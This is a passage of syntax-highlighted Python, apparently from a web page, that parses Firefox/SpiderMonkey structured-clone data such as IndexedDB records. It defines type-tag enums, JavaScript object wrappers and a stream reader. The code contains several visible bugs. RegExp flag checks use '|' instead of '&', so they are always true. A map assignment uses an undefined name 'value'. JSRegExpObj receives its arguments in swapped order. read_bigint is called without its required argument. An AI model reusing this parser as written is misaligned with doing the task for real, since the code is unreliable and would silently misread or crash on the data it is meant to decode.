class="built_in">bool</span>(self)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self, other: <span class="built_in">bool</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">str</span>(<span class="built_in">bool</span>(self))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">_HashableContainer</span>:</span><br><span class="line">inner: <span class="built_in">object</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, inner: <span class="built_in">object</span></span>):</span><br><span class="line">self.inner = inner</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__hash__</span>(<span class="params">self</span>):</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">id</span>(self.inner)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">repr</span>(self.inner)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">str</span>(self.inner)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">JSMapObj</span>(collections.UserDict):</span><br><span class="line"><span class="string">&quot;&quot;&quot;JavaScript compatible Map object that allows arbitrary values for the key.&quot;&quot;&quot;</span></span><br><span class="line"><span class="meta">@staticmethod</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">key_to_hashable</span>(<span class="params">key: <span class="built_in">object</span></span>) -&gt; collections.abc.Hashable:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="built_in">hash</span>(key)</span><br><span class="line"><span class="keyword">except</span> TypeError:</span><br><span class="line"><span class="keyword">return</span> _HashableContainer(key)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__contains__</span>(<span class="params">self, key: <span class="built_in">object</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">super</span>().__contains__(self.key_to_hashable(key))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__delitem__</span>(<span class="params">self, key: <span class="built_in">object</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">super</span>().__delitem__(self.key_to_hashable(key))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__getitem__</span>(<span class="params">self, key: <span class="built_in">object</span></span>) -&gt; <span class="built_in">object</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">super</span>().__getitem__(self.key_to_hashable(key))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__iter__</span>(<span class="params">self</span>) -&gt; typing.Iterator[<span class="built_in">object</span>]:</span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> <span class="built_in">super</span>().__iter__():</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">isinstance</span>(key, _HashableContainer):</span><br><span class="line">key = key.inner</span><br><span class="line"><span class="keyword">yield</span> key</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__setitem__</span>(<span class="params">self, key: <span class="built_in">object</span>, value: <span class="built_in">object</span></span>):</span><br><span class="line"><span class="built_in">super</span>().__setitem__(self.key_to_hashable(key), value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">JSNumberObj</span>(<span class="title class_ inherited__">float</span>):</span><br><span class="line"><span class="string">&quot;&quot;&quot;Type to represent JavaScript number/float “objects” (vs the primitive type)&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">JSRegExpObj</span>:</span><br><span class="line">expr:  <span class="built_in">str</span></span><br><span class="line">flags: <span class="string">&#x27;RegExpFlag&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, expr: <span class="built_in">str</span>, flags: <span class="string">&#x27;RegExpFlag&#x27;</span></span>):</span><br><span class="line">self.expr  = expr</span><br><span class="line">self.flags = flags</span><br><span class="line"></span><br><span class="line"><span class="meta">@classmethod</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">from_re</span>(<span class="params">cls, regex: re.Pattern</span>) -&gt; <span class="string">&#x27;JSRegExpObj&#x27;</span>:</span><br><span class="line">flags = RegExpFlag.GLOBAL</span><br><span class="line"><span class="keyword">if</span> regex.flags | re.DOTALL:</span><br><span class="line"><span class="keyword">pass</span>  <span class="comment"># Not supported in current (2020-01) version of SpiderMonkey</span></span><br><span class="line"><span class="keyword">if</span> regex.flags | re.IGNORECASE:</span><br><span class="line">flags |= RegExpFlag.IGNORE_CASE</span><br><span class="line"><span class="keyword">if</span> regex.flags | re.MULTILINE:</span><br><span class="line">flags |= RegExpFlag.MULTILINE</span><br><span class="line"><span class="keyword">return</span> cls(regex.pattern, flags)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">to_re</span>(<span class="params">self</span>) -&gt; re.Pattern:</span><br><span class="line">flags = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> self.flags | RegExpFlag.IGNORE_CASE:</span><br><span class="line">flags |= re.IGNORECASE</span><br><span class="line"><span class="keyword">if</span> self.flags | RegExpFlag.GLOBAL:</span><br><span class="line"><span class="keyword">pass</span>  <span class="comment"># Matching type depends on matching function used in Python</span></span><br><span class="line"><span class="keyword">if</span> self.flags | RegExpFlag.MULTILINE:</span><br><span class="line">flags |= re.MULTILINE</span><br><span class="line"><span class="keyword">if</span> self.flags | RegExpFlag.UNICODE:</span><br><span class="line"><span class="keyword">pass</span>  <span class="comment">#XXX</span></span><br><span class="line"><span class="keyword">return</span> re.<span class="built_in">compile</span>(self.expr, flags)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">JSSavedFrame</span>:</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line"><span class="keyword">raise</span> NotImplementedError()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">JSSetObj</span>:</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line"><span class="keyword">raise</span> NotImplementedError()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">JSStringObj</span>(<span class="title class_ inherited__">str</span>):</span><br><span class="line"><span class="string">&quot;&quot;&quot;Type to represent JavaScript string “objects” (vs the primitive type)&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DataType</span>(enum.IntEnum):</span><br><span class="line"><span class="comment"># Special values</span></span><br><span class="line">FLOAT_MAX = <span class="number">0xFFF00000</span></span><br><span class="line">HEADER    = <span class="number">0xFFF10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Basic JavaScript types</span></span><br><span class="line">NULL      = <span class="number">0xFFFF0000</span></span><br><span class="line">UNDEFINED = <span class="number">0xFFFF0001</span></span><br><span class="line">BOOLEAN   = <span class="number">0xFFFF0002</span></span><br><span class="line">INT32     = <span class="number">0xFFFF0003</span></span><br><span class="line">STRING    = <span class="number">0xFFFF0004</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Extended JavaScript types</span></span><br><span class="line">DATE_OBJECT           = <span class="number">0xFFFF0005</span></span><br><span class="line">REGEXP_OBJECT         = <span class="number">0xFFFF0006</span></span><br><span class="line">ARRAY_OBJECT          = <span class="number">0xFFFF0007</span></span><br><span class="line">OBJECT_OBJECT         = <span class="number">0xFFFF0008</span></span><br><span class="line">ARRAY_BUFFER_OBJECT   = <span class="number">0xFFFF0009</span></span><br><span class="line">BOOLEAN_OBJECT        = <span class="number">0xFFFF000A</span></span><br><span class="line">STRING_OBJECT         = <span class="number">0xFFFF000B</span></span><br><span class="line">NUMBER_OBJECT         = <span class="number">0xFFFF000C</span></span><br><span class="line">BACK_REFERENCE_OBJECT = <span class="number">0xFFFF000D</span></span><br><span class="line"><span class="comment">#DO_NOT_USE_1</span></span><br><span class="line"><span class="comment">#DO_NOT_USE_2</span></span><br><span class="line">TYPED_ARRAY_OBJECT    = <span class="number">0xFFFF0010</span></span><br><span class="line">MAP_OBJECT            = <span class="number">0xFFFF0011</span></span><br><span class="line">SET_OBJECT            = <span class="number">0xFFFF0012</span></span><br><span class="line">END_OF_KEYS           = <span class="number">0xFFFF0013</span></span><br><span class="line"><span class="comment">#DO_NOT_USE_3</span></span><br><span class="line">DATA_VIEW_OBJECT      = <span class="number">0xFFFF0015</span></span><br><span class="line">SAVED_FRAME_OBJECT    = <span class="number">0xFFFF0016</span>  <span class="comment"># ?</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Principals ?</span></span><br><span class="line">JSPRINCIPALS      = <span class="number">0xFFFF0017</span></span><br><span class="line">NULL_JSPRINCIPALS = <span class="number">0xFFFF0018</span></span><br><span class="line">RECONSTRUCTED_SAVED_FRAME_PRINCIPALS_IS_SYSTEM     = <span class="number">0xFFFF0019</span></span><br><span class="line">RECONSTRUCTED_SAVED_FRAME_PRINCIPALS_IS_NOT_SYSTEM = <span class="number">0xFFFF001A</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ?</span></span><br><span class="line">SHARED_ARRAY_BUFFER_OBJECT = <span class="number">0xFFFF001B</span></span><br><span class="line">SHARED_WASM_MEMORY_OBJECT  = <span class="number">0xFFFF001C</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arbitrarily sized integers</span></span><br><span class="line">BIGINT        = <span class="number">0xFFFF001D</span></span><br><span class="line">BIGINT_OBJECT = <span class="number">0xFFFF001E</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Older typed arrays</span></span><br><span class="line">TYPED_ARRAY_V1_MIN           = <span class="number">0xFFFF0100</span></span><br><span class="line">TYPED_ARRAY_V1_INT8          = TYPED_ARRAY_V1_MIN + <span class="number">0</span></span><br><span class="line">TYPED_ARRAY_V1_UINT8         = TYPED_ARRAY_V1_MIN + <span class="number">1</span></span><br><span class="line">TYPED_ARRAY_V1_INT16         = TYPED_ARRAY_V1_MIN + <span class="number">2</span></span><br><span class="line">TYPED_ARRAY_V1_UINT16        = TYPED_ARRAY_V1_MIN + <span class="number">3</span></span><br><span class="line">TYPED_ARRAY_V1_INT32         = TYPED_ARRAY_V1_MIN + <span class="number">4</span></span><br><span class="line">TYPED_ARRAY_V1_UINT32        = TYPED_ARRAY_V1_MIN + <span class="number">5</span></span><br><span class="line">TYPED_ARRAY_V1_FLOAT32       = TYPED_ARRAY_V1_MIN + <span class="number">6</span></span><br><span class="line">TYPED_ARRAY_V1_FLOAT64       = TYPED_ARRAY_V1_MIN + <span class="number">7</span></span><br><span class="line">TYPED_ARRAY_V1_UINT8_CLAMPED = TYPED_ARRAY_V1_MIN + <span class="number">8</span></span><br><span class="line">TYPED_ARRAY_V1_MAX           = TYPED_ARRAY_V1_UINT8_CLAMPED</span><br><span class="line"></span><br><span class="line"><span class="comment"># Transfer-only tags (not used for persistent data)</span></span><br><span class="line">TRANSFER_MAP_HEADER              = <span class="number">0xFFFF0200</span></span><br><span class="line">TRANSFER_MAP_PENDING_ENTRY       = <span class="number">0xFFFF0201</span></span><br><span class="line">TRANSFER_MAP_ARRAY_BUFFER        = <span class="number">0xFFFF0202</span></span><br><span class="line">TRANSFER_MAP_STORED_ARRAY_BUFFER = <span class="number">0xFFFF0203</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RegExpFlag</span>(enum.IntFlag):</span><br><span class="line">IGNORE_CASE = <span class="number">0b00001</span></span><br><span class="line">GLOBAL      = <span class="number">0b00010</span></span><br><span class="line">MULTILINE   = <span class="number">0b00100</span></span><br><span class="line">UNICODE     = <span class="number">0b01000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Scope</span>(enum.IntEnum):</span><br><span class="line">SAME_PROCESS                   = <span class="number">1</span></span><br><span class="line">DIFFERENT_PROCESS              = <span class="number">2</span></span><br><span class="line">DIFFERENT_PROCESS_FOR_INDEX_DB = <span class="number">3</span></span><br><span class="line">UNASSIGNED                     = <span class="number">4</span></span><br><span class="line">UNKNOWN_DESTINATION            = <span class="number">5</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">_Input</span>:</span><br><span class="line">stream: io.BufferedReader</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, stream: io.BufferedReader</span>):</span><br><span class="line">self.stream = stream</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">peek</span>(<span class="params">self</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">return</span> struct.unpack_from(<span class="string">&quot;&lt;q&quot;</span>, self.stream.peek(<span class="number">8</span>))[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">except</span> struct.error:</span><br><span class="line"><span class="keyword">raise</span> EOFError() <span class="keyword">from</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">peek_pair</span>(<span class="params">self</span>) -&gt; (<span class="built_in">int</span>, <span class="built_in">int</span>):</span><br><span class="line">v = self.peek()</span><br><span class="line"><span class="keyword">return</span> ((v &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xFFFFFFFF</span>, (v &gt;&gt; <span class="number">0</span>) &amp; <span class="number">0xFFFFFFFF</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">drop_padding</span>(<span class="params">self, read_length</span>):</span><br><span class="line">length = <span class="number">8</span> - ((read_length - <span class="number">1</span>) % <span class="number">8</span>) - <span class="number">1</span></span><br><span class="line">result = self.stream.read(length)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(result) &lt; length:</span><br><span class="line"><span class="keyword">raise</span> EOFError()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">self, fmt=<span class="string">&quot;q&quot;</span></span>):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">return</span> struct.unpack(<span class="string">&quot;&lt;&quot;</span> + fmt, self.stream.read(<span class="number">8</span>))[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">except</span> struct.error:</span><br><span class="line"><span class="keyword">raise</span> EOFError() <span class="keyword">from</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_bytes</span>(<span class="params">self, length: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">result = self.stream.read(length)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(result) &lt; length:</span><br><span class="line"><span class="keyword">raise</span> EOFError()</span><br><span class="line">self.drop_padding(length)</span><br><span class="line"><span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_pair</span>(<span class="params">self</span>) -&gt; (<span class="built_in">int</span>, <span class="built_in">int</span>):</span><br><span class="line">v = self.read()</span><br><span class="line"><span class="keyword">return</span> ((v &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xFFFFFFFF</span>, (v &gt;&gt; <span class="number">0</span>) &amp; <span class="number">0xFFFFFFFF</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_double</span>(<span class="params">self</span>) -&gt; <span class="built_in">float</span>:</span><br><span class="line"><span class="keyword">return</span> self.read(<span class="string">&quot;d&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Reader</span>:</span><br><span class="line">all_objs: typing.<span class="type">List</span>[typing.<span class="type">Union</span>[<span class="built_in">list</span>, <span class="built_in">dict</span>]]</span><br><span class="line">compat:   <span class="built_in">bool</span></span><br><span class="line"><span class="built_in">input</span>:    _Input</span><br><span class="line">objs:     typing.<span class="type">List</span>[typing.<span class="type">Union</span>[<span class="built_in">list</span>, <span class="built_in">dict</span>]]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, stream: io.BufferedReader</span>):</span><br><span class="line">self.<span class="built_in">input</span> = _Input(stream)</span><br><span class="line"></span><br><span class="line">self.all_objs = []</span><br><span class="line">self.compat   = <span class="literal">False</span></span><br><span class="line">self.objs     = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">self</span>):</span><br><span class="line">self.read_header()</span><br><span class="line">self.read_transfer_map()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Start out by reading in the main object and pushing it onto the &#x27;objs&#x27;</span></span><br><span class="line"><span class="comment"># stack. The data related to this object and its descendants extends</span></span><br><span class="line"><span class="comment"># from here to the SCTAG_END_OF_KEYS at the end of the stream.</span></span><br><span class="line">add_obj, result = self.start_read()</span><br><span class="line"><span class="keyword">if</span> add_obj:</span><br><span class="line">self.all_objs.append(result)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Stop when the stack shows that all objects have been read.</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(self.objs) &gt; <span class="number">0</span>:</span><br><span class="line"><span class="comment"># What happens depends on the top obj on the objs stack.</span></span><br><span class="line">obj = self.objs[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">tag, data = self.<span class="built_in">input</span>.peek_pair()</span><br><span class="line"><span class="keyword">if</span> tag == DataType.END_OF_KEYS:</span><br><span class="line"><span class="comment"># Pop the current obj off the stack, since we are done with it</span></span><br><span class="line"><span class="comment"># and its children.</span></span><br><span class="line">self.<span class="built_in">input</span>.read_pair()</span><br><span class="line">self.objs.pop()</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The input stream contains a sequence of &quot;child&quot; values, whose</span></span><br><span class="line"><span class="comment"># interpretation depends on the type of obj. These values can be</span></span><br><span class="line"><span class="comment"># anything.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># startRead() will allocate the (empty) object, but note that when</span></span><br><span class="line"><span class="comment"># startRead() returns, &#x27;key&#x27; is not yet initialized with any of its</span></span><br><span class="line"><span class="comment"># properties. Those will be filled in by returning to the head of</span></span><br><span class="line"><span class="comment"># this loop, processing the first child obj, and continuing until</span></span><br><span class="line"><span class="comment"># all children have been fully created.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Note that this means the ordering in the stream is a little funky</span></span><br><span class="line"><span class="comment"># for things like Map. See the comment above startWrite() for an</span></span><br><span class="line"><span class="comment"># example.</span></span><br><span class="line">add_obj, key = self.start_read()</span><br><span class="line"><span class="keyword">if</span> add_obj:</span><br><span class="line">self.all_objs.append(key)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Backwards compatibility: Null formerly indicated the end of</span></span><br><span class="line"><span class="comment"># object properties.</span></span><br><span class="line"><span class="keyword">if</span> key <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">and</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(obj, (JSMapObj, JSSetObj, JSSavedFrame)):</span><br><span class="line">self.objs.pop()</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set object: the values between obj header (from startRead()) and</span></span><br><span class="line"><span class="comment"># DataType.END_OF_KEYS are interpreted as values to add to the set.</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">isinstance</span>(obj, JSSetObj):</span><br><span class="line">obj.add(key)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">isinstance</span>(obj, JSSavedFrame):</span><br><span class="line"><span class="keyword">raise</span> NotImplementedError()  <span class="comment">#<span class="doctag">XXX:</span> TODO</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Everything else uses a series of key, value, key, value, … objects.</span></span><br><span class="line">add_obj, val = self.start_read()</span><br><span class="line"><span class="keyword">if</span> add_obj:</span><br><span class="line">self.all_objs.append(val)</span><br><span class="line"></span><br><span class="line"><span class="comment"># For a Map, store those &lt;key,value&gt; pairs in the contained map</span></span><br><span class="line"><span class="comment"># data structure.</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">isinstance</span>(obj, JSMapObj):</span><br><span class="line">obj[key] = value</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(key, (<span class="built_in">str</span>, <span class="built_in">int</span>)):</span><br><span class="line"><span class="comment">#continue</span></span><br><span class="line"><span class="keyword">raise</span> ParseError(<span class="string">&quot;JavaScript object key must be a string or integer&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">isinstance</span>(obj, <span class="built_in">list</span>):</span><br><span class="line"><span class="comment"># Ignore object properties on array</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(key, <span class="built_in">int</span>) <span class="keyword">or</span> key &lt; <span class="number">0</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Extend list with extra slots if needed</span></span><br><span class="line"><span class="keyword">while</span> key &gt;= <span class="built_in">len</span>(obj):</span><br><span class="line">obj.append(<span class="literal">NotImplemented</span>)</span><br><span class="line"></span><br><span class="line">obj[key] = val</span><br><span class="line"></span><br><span class="line">self.all_objs.clear()</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_header</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">tag, data = self.<span class="built_in">input</span>.peek_pair()</span><br><span class="line"></span><br><span class="line">scope: <span class="built_in">int</span></span><br><span class="line"><span class="keyword">if</span> tag == DataType.HEADER:</span><br><span class="line">tag, data = self.<span class="built_in">input</span>.read_pair()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> data == <span class="number">0</span>:</span><br><span class="line">data = <span class="built_in">int</span>(Scope.SAME_PROCESS)</span><br><span class="line"></span><br><span class="line">scope = data</span><br><span class="line"><span class="keyword">else</span>:  <span class="comment"># Old on-disk format</span></span><br><span class="line">scope = <span class="built_in">int</span>(Scope.DIFFERENT_PROCESS_FOR_INDEX_DB)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> scope == Scope.DIFFERENT_PROCESS:</span><br><span class="line">self.compat = <span class="literal">False</span></span><br><span class="line"><span class="keyword">elif</span> scope == Scope.DIFFERENT_PROCESS_FOR_INDEX_DB:</span><br><span class="line">self.compat = <span class="literal">True</span></span><br><span class="line"><span class="keyword">elif</span> scope == Scope.SAME_PROCESS:</span><br><span class="line"><span class="keyword">raise</span> InvalidHeaderError(<span class="string">&quot;Can only parse persistent data&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">raise</span> InvalidHeaderError(<span class="string">&quot;Invalid scope&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_transfer_map</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">tag, data = self.<span class="built_in">input</span>.peek_pair()</span><br><span class="line"><span class="keyword">if</span> tag == DataType.TRANSFER_MAP_HEADER:</span><br><span class="line"><span class="keyword">raise</span> InvalidHeaderError(<span class="string">&quot;Transfer maps are not allowed for persistent data&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_bigint</span>(<span class="params">self, info: <span class="built_in">int</span></span>) -&gt; JSBigInt:</span><br><span class="line">length   = info &amp; <span class="number">0x7FFFFFFF</span></span><br><span class="line">negative = <span class="built_in">bool</span>(info &amp; <span class="number">0x80000000</span>)</span><br><span class="line"><span class="keyword">raise</span> NotImplementedError()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_string</span>(<span class="params">self, info: <span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">length = info &amp; <span class="number">0x7FFFFFFF</span></span><br><span class="line">latin1 = <span class="built_in">bool</span>(info &amp; <span class="number">0x80000000</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> latin1:</span><br><span class="line"><span class="keyword">return</span> self.<span class="built_in">input</span>.read_bytes(length).decode(<span class="string">&quot;latin-1&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> self.<span class="built_in">input</span>.read_bytes(length * <span class="number">2</span>).decode(<span class="string">&quot;utf-16le&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start_read</span>(<span class="params">self</span>):</span><br><span class="line">tag, data = self.<span class="built_in">input</span>.read_pair()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> tag == DataType.NULL:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> tag == DataType.UNDEFINED:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">NotImplemented</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> tag == DataType.INT32:</span><br><span class="line"><span class="keyword">if</span> data &gt; <span class="number">0x7FFFFFFF</span>:</span><br><span class="line">data -= <span class="number">0x80000000</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span>, JSInt32(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> tag == DataType.BOOLEAN:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span>, <span class="built_in">bool</span>(data)</span><br><span class="line"><span class="keyword">elif</span> tag == DataType.BOOLEAN_OBJECT:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span>, JSBooleanObj(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> tag == DataType.STRING:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span>, self.read_string(data)</span><br><span class="line"><span class="keyword">elif</span> tag == DataType.STRING_OBJECT:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span>, JSStringObj(self.read_string(data))</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> tag == DataType.NUMBER_OBJECT:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span>, JSNumberObj(self.<span class="built_in">input</span>.read_double())</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> tag == DataType.BIGINT:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span>, self.read_bigint()</span><br><span class="line"><span class="keyword">elif</span> tag == DataType.BIGINT_OBJECT:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span>, JSBigIntObj(self.read_bigint())</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> tag == DataType.DATE_OBJECT:</span><br><span class="line"><span class="comment"># These timestamps are always UTC</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span>, datetime.datetime.fromtimestamp(self.<span class="built_in">input</span>.read_double(),</span><br><span class="line">                                             datetime.timezone.utc)</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> tag == DataType.REGEXP_OBJECT:</span><br><span class="line">flags = RegExpFlag(data)</span><br><span class="line"></span><br><span class="line">tag2, data2 = self.<span class="built_in">input</span>.read_pair()</span><br><span class="line"><span class="keyword">if</span> tag2 != DataType.STRING:</span><br><span class="line"><span class="comment">#return False, False</span></span><br><span class="line"><span class="keyword">raise</span> ParseError(<span class="string">&quot;RegExp type must be followed by string&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span>, JSRegExpObj(flags, self.read_string(data2))</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> tag == DataType.ARRAY_OBJECT:</span><br><span class="line">obj = []</span><br><span class="line">self.objs.append(obj)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span>, obj</span><br><span class="line"><span class="keyword">elif</span> tag == DataType.OBJECT_OBJECT:</span><br><span class="line">obj = &#123;&#125;</span><br><span class="line">self.objs.append(obj)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span>, obj</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> tag == DataType.BACK_REFERENCE_OBJECT:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span>, self.all_objs[data]</span><br><span class="line"><span class="keyword">except</span> IndexError:</span><br><span class="line"><span class="comment">#return False, False</span></span><br><span class="line"><span class="keyword">raise</span> ParseError(<span class="string">&quot;Object backreference to non-existing object&quot;</span>) <span class="keyword">from</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> tag == DataType.ARRAY_BUFFER_OBJECT:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span>, self.read_array_buffer(data)  